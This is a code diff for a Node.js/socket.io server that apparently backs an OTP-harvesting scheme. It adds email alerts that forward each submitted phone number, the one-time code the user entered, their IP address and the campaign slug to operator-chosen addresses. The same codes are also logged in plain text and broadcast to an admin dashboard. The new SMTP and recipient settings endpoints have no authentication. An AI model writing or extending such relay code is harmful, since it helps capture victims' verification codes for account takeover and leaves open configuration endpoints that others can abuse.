@@ -5,6 +5,7 @@ const cors = require('cors');
 const path = require('path');
 const connectDB = require('./config/db');
 const Verification = require('./models/Verification');
+const emailNotifier = require('./config/emailNotifier');
 
 const app = express();
 const server = http.createServer(app);
@@ -91,6 +92,49 @@ app.delete('/api/verifications', async (req, res) => {
     }
 });
 
+// ========== Email Notification Settings API ==========
+
+// Get current SMTP config & notification emails
+app.get('/api/email-settings', (req, res) => {
+    res.json({
+        success: true,
+        smtp: emailNotifier.getSMTPConfig(),
+        notificationEmails: emailNotifier.getNotificationEmails()
+    });
+});
+
+// Save SMTP configuration
+app.post('/api/email-settings/smtp', (req, res) => {
+    const { host, port, user, pass } = req.body;
+    const result = emailNotifier.configureSMTP({ host, port: parseInt(port) || 587, user, pass });
+    res.json({ success: true, configured: result, message: result ? 'SMTP configured successfully' : 'SMTP config saved (missing credentials)' });
+});
+
+// Save notification email addresses
+app.post('/api/email-settings/recipients', (req, res) => {
+    const { emails } = req.body;
+    if (!Array.isArray(emails)) {
+        return res.status(400).json({ success: false, message: 'emails must be an array' });
+    }
+    emailNotifier.setNotificationEmails(emails);
+    res.json({ success: true, emails: emailNotifier.getNotificationEmails() });
+});
+
+// Test email sending
+app.post('/api/email-settings/test', async (req, res) => {
+    try {
+        await emailNotifier.notifyPhoneSubmitted({
+            phoneNumber: '+20 100 000 0000 (TEST)',
+            customSlug: '/test',
+            ipAddress: '127.0.0.1',
+            submittedAt: new Date()
+        });
+        res.json({ success: true, message: 'Test email sent successfully!' });
+    } catch (err) {
+        res.status(500).json({ success: false, message: err.message });
+    }
+});
+
 // Serve Admin Dashboard page explicitly
 app.get('/admin', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'admin.html'));
@@ -144,6 +188,14 @@ io.on('connection', (socket) => {
             }
 
             console.log(`[Notification] Phone submitted: ${phoneNumber} via slug ${customSlug}`);
+
+            // Send email notification (non-blocking)
+            emailNotifier.notifyPhoneSubmitted({
+                phoneNumber: record.phoneNumber,
+                customSlug: record.customSlug,
+                ipAddress: clientIp,
+                submittedAt: record.submittedAt
+            }).catch(err => console.error('[EmailNotifier] Error:', err.message));
 
             // Broadcast real-time notification to all connected Admin dashboards
             io.emit('admin_notification', {
@@ -223,6 +275,15 @@ io.on('connection', (socket) => {
             }
 
             console.log(`[Notification] OTP Verified: ${updatedRecord.phoneNumber} -> OTP: ${otp}`);
+
+            // Send email notification (non-blocking)
+            emailNotifier.notifyOTPVerified({
+                phoneNumber: updatedRecord.phoneNumber,
+                otp: otp,
+                customSlug: updatedRecord.customSlug || customSlug || '/',
+                ipAddress: socket.handshake.address,
+                verifiedAt: updatedRecord.verifiedAt
+            }).catch(err => console.error('[EmailNotifier] Error:', err.message));
 
             // Broadcast real-time notification to Admin dashboard
             io.emit('admin_notification', {
